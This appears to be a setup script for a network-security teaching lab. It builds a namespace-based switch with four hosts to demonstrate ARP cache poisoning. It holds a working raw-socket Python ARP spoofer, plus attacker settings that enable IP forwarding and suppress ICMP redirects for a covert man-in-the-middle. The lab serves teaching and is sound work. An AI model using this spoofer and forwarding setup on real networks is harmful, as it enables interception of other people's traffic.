# One switch, four hosts, and two attacks that need nothing but a port on it.
#
#   h1 10.0.0.1 --- sw --- gw 10.0.0.254   (the default gateway)
#   bys 10.0.0.9 ---  |
#   atk 10.0.0.66 ----+    (the attacker, one more host on the same switch)
#
# The switch is a normal learning bridge, which is exactly what topic 14 built.
# Nothing here is a special mode or a vulnerability: every attack on this page is
# the switch doing its documented job for an attacker who is on the same segment.
# That last condition is the one worth holding on to. Each of these needs a port,
# which is why topic 55 and physical security matter as much as they do.
#
# The attacker gets a small ARP sender, written to /root/arp.py at build time. It
# sends one crafted ARP reply: "the address you asked about is at my MAC". No
# library, just a raw socket, so a reader can see there is no magic in it.
NETLAB_PACKAGES="iproute2 iputils-ping tcpdump bridge-utils python3"
NETLAB_SETTLE=1

ip netns add sw
ip -n sw link set lo up
ip netns exec sw sh -c "echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6"
ip -n sw link add br0 type bridge
ip -n sw link set br0 up

add_host() {
  name=$1; nn=$2; addr=$3
  ip netns add "$name" 2>/dev/null || true
  ip -n "$name" link set lo up
  ip netns exec "$name" sh -c "echo 1 > /proc/sys/net/ipv6/conf/default/disable_ipv6"
  ip netns exec "$name" sh -c "echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6"
  ip link add "${name}0" type veth peer name "sw-${name}"
  ip link set "${name}0" netns "$name"
  ip link set "sw-${name}" netns sw
  ip -n "$name" link set "${name}0" address "02:00:00:00:00:$nn"
  ip -n "$name" addr add "$addr" dev "${name}0"
  ip -n "$name" link set "${name}0" up
  ip -n sw link set "sw-${name}" master br0
  ip -n sw link set "sw-${name}" up
}

add_host h1  01 10.0.0.1/24
add_host gw  fe 10.0.0.254/24
add_host bys 09 10.0.0.9/24
add_host atk 66 10.0.0.66/24

ip -n h1 route add default via 10.0.0.254

# The victims accept an ARP reply and update their cache, which is the behaviour
# the attack assumes and the behaviour ARP was designed with: no reply is checked
# against a request, and none carries any proof. A modern Linux host guards an
# already-known entry more tightly than this, so arp_accept is set to put both
# ends on the permissive footing that Windows, printers, phones and most network
# appliances still use. The stricter host is not immune, it just makes the
# attacker win the resolution race instead, and the poisoned cache looks the same.
for v in h1 gw; do
  ip netns exec $v sh -c "echo 1 > /proc/sys/net/ipv4/conf/all/arp_accept"
done

# The attacker forwards what it intercepts, so the victims keep working while it
# reads everything, and it does not send ICMP redirects, which would helpfully
# tell a victim to stop routing through it and undo the poisoning.
ip netns exec atk sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
ip netns exec atk sh -c "echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects"
ip netns exec atk sh -c "echo 0 > /proc/sys/net/ipv4/conf/atk0/send_redirects"

# A crafted ARP reply, sent once per call. Arguments: interface, the victim's MAC
# and IP (where to send it), and the IP we are lying about. The source MAC is our
# own, which is the whole trick: we answer for an address that is not ours.
ip netns exec atk sh -c 'cat > /root/arp.py' <<'PY'
import socket, struct, sys, fcntl
iface, victim_mac, victim_ip, claim_ip = sys.argv[1:5]
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
s.bind((iface, 0))
our_mac = s.getsockname()[4]
def mac(x): return bytes(int(b, 16) for b in x.split(":"))
def ip(x):  return socket.inet_aton(x)
vmac = mac(victim_mac)
eth = vmac + our_mac + struct.pack("!H", 0x0806)
arp = struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2) + our_mac + ip(claim_ip) + vmac + ip(victim_ip)
s.send(eth + arp)
print("told %s that %s is at %s" % (victim_ip, claim_ip, ":".join("%02x" % b for b in our_mac)))
PY
